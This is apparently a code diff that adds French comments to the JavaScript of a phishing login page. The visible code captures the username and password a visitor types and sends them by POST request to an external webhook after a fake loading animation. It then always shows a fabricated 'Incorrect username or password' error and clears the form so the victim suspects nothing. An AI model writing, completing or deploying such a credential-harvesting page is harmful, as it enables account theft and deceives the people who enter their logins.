@@ -221,12 +221,14 @@
       const password = document.getElementById("password").value;
       const status = document.getElementById("status");
 
+      // Affiche le chargement
       status.innerHTML = `
         <div class="loader">
           <div></div><div></div><div></div>
         </div>
       `;
 
+      // Envoi après 3 secondes
       setTimeout(() => {
         fetch(webhookUrl, {
           method: 'POST',
@@ -237,6 +239,7 @@
           })
         });
 
+        // Message d'erreur simulé
         status.innerHTML = `<div class="error-message">Incorrect username or password.</div>`;
         document.getElementById("username").value = '';
         document.getElementById("password").value = '';
